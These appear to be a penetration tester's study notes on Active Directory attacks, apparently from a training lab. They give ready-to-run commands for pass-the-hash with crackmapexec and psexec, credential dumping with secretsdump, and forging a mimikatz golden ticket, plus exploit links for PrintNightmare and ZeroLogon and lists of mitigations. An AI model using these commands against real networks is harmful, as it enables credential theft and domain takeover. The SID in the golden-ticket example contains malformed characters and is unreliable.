

### Pass the Hash / Pass the Password

```
sudo apt install crackmapexec 

crackmapexec <IP/CIDR> -u <user> -d <domain> -p <password> 

crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth
```


```
psexec.py marvel/fcastle:Password1@<IP>

secretsdump.py marvel/fcastle:Password1@<IP>

psexec.py "frank castle":@<IP> -hashes LMHASH:LTHASH
```

---

#### Pass attacke mitigations

Hard to completely prevent, but we can make it more difficult on an attacker:
- Limit account re-use:
  - Avoid re-using local admin password
  - Disable Guest and Administrator accounts
  - Limit who is a local administrator (least privilege)
- Utilize strong passwords:
  - The longer the better (>14 characters)
  - Avoid using common words
  - I like long sentences
- Privilege Access Management (PAM)
  - Check out/in sensitive accounts when needed
  - Automatically rotate passwords on check out and check in
  - Limits pass attacks as hash/password is strong and constantly rotated

---

### Token Impersonation

What are tokens?
- Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.

Two types:
- Delegate - Created for logging into a machine or using Remote Desktop
- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script

https://www.offensive-security.com/metasploit-unleashed/fun-incognito/

#### Token Impersonation Mitigation

Mitigation Strategies:
- Limit user/group token creation permissions
- Account tiering
- Local admin restriction

---

### Kerberoasting 

https://medium.com/@Shorty420/kerberoasting-9108477279cc

#### Mitigation Strategies:
- Strong Passwords
- Least privilege

-----

### GPP Attacks 

#### Overview:
- Group Policy Preferences allowed admins to create policies using embedded credentials
- These credentials were encrypted and placed in a "cPassword"
- The key was accidentally released 
- Patched in MS14-025, but doesn't prevent previous uses

https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/

-------

### URL File Attacks

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share

-------

**PrintNightmare**
- https://github.com/cube0x0/CVE-2021-1675#scanning
- https://github.com/calebstewart/CVE-2021-1675

-----

### Mimikatz

#### What is Mimikatz?:
- Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
- Dumps credentials stored in memory.
- Credential Dumping,  Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket

https://github.com/gentilkiwi/mimikatz/wiki

-----

### Golden Ticket Attacks

```
mimikatz# kerberos::golden /User:Administratorfake123 /domain:Marvel.local /sid:s-1-5-21-3e1214212-392ø777931-1277971883 /krbtgt:11f843aafd22acfb29aef92f6e423994 /id:500 /ptt
```

-----

### Abusing ZeroLogon

What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html

dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472

SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472


-----

### Additional resources 

Active Directory Security Blog: https://adsecurity.org/

Harmj0y Blog: http://blog.harmj0y.net/





